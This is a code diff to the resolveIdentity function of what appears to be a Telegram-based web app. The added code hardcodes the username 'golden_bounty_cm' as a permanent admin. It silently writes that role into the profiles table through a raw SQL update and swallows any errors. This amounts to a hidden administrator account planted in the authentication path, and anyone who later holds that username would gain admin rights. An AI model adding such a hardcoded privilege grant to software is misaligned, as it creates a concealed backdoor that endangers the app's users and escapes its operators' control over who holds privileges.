@@ -59,6 +59,16 @@ export async function resolveIdentity(initData) {
   if (!row) throw new Error("Open the app from Telegram to create your account");
   if (row.tg_banned || row.profile_banned) throw new Error("Your account is banned");
 
+  // Platform owner — this Telegram username always receives admin access.
+  // The profiles row is synced so the role persists everywhere.
+  const ADMIN_USERNAMES = ["golden_bounty_cm"];
+  let role = row.role || "user";
+  const uname = String(tgUser.username || "").replace(/^@+/, "").toLowerCase();
+  if (ADMIN_USERNAMES.includes(uname) && role !== "admin") {
+    role = "admin";
+    await runSql(`update profiles set role = 'admin' where email = ${sqlString(identityEmail)}`).catch(() => null);
+  }
+
   const value = {
     telegram_id: telegramId,
     identity_email: identityEmail,
@@ -66,8 +76,8 @@ export async function resolveIdentity(initData) {
     first_name: tgUser.first_name || "",
     last_name: tgUser.last_name || "",
     photo_url: tgUser.photo_url || "",
-    profile: { role: row.role || "user", balance: Number(row.balance) || 0 },
-    role: row.role || "user",
+    profile: { role, balance: Number(row.balance) || 0 },
+    role,
   };
   if (identityCache.size > 100) identityCache.clear();
   identityCache.set(initData, { ts: Date.now(), value });
